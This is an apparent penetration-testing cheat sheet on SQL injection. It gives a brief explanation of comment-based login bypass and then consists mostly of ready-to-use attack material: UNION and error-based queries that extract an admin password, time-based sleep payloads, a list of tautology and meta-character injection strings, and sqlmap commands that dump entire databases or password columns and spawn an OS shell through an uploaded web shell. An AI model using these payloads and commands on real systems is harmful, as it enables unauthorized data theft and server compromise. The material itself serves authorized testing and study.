SQL Injection 
A SQL injection is an attack in which the attacker executes arbitrary SQL
commands on an application’s database by supplying malicious input inserted into a SQL statement.

Injecting Code into SQL Queries
A SQL injection attack occurs when an attacker is able to inject code into the
SQL statements that the target web application uses to access its database,
thereby executing whatever SQL code the attacker wishes.

Sample Queries
SELECT id FROM users WHERE username='admin';-- ' AND Password='password123';
The -- sequence denotes the start of a SQL comment, which doesn’t get interpreted as code, 
so by adding -- into the username part of the query, the attacker effectively comments out the rest of the SQL query. 
The query becomes this: SELECT id FROM users WHERE username='admin';

SELECT title, body FROM emails 
WHERE username='vickie' 
AND accesskey='ZB6w0YLjzvAVmp6zvr'
UNION SELECT 1,
CONVERT((SELECT password FROM users WHERE username="admin"), DATE);--

' or sleep(15) and 1=1#
' or sleep(15)#
' union select sleep(15),null#

Meta Characters
'
''
;%00
--
-- -
""
;
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '
OR 1=1


SQLMap 
1 Saved burp req
2 sqlmap -r 
-r = path to saved req
-p = parameter to test for 

sqlmap -r /home/hapihacker/burprequest1 -p vuln-param –dump-all

If you’re not interested in dumping the entire database, you could use
the --dump command to specify the exact table and columns you would like:
$ sqlmap -r /home/hapihacker/burprequest1 -p vuln-param –dump -T users -C password -D helpdesk

Sometimes SQL injection vulnerabilities will allow you to upload a web
shell to the server that can then be executed to obtain system access. You
could use one of SQLmap’s commands to automatically attempt to upload a
web shell and execute the shell to grant you with system access:
$ sqlmap -r /home/hapihacker/burprequest1 -p vuln-param –os-shell
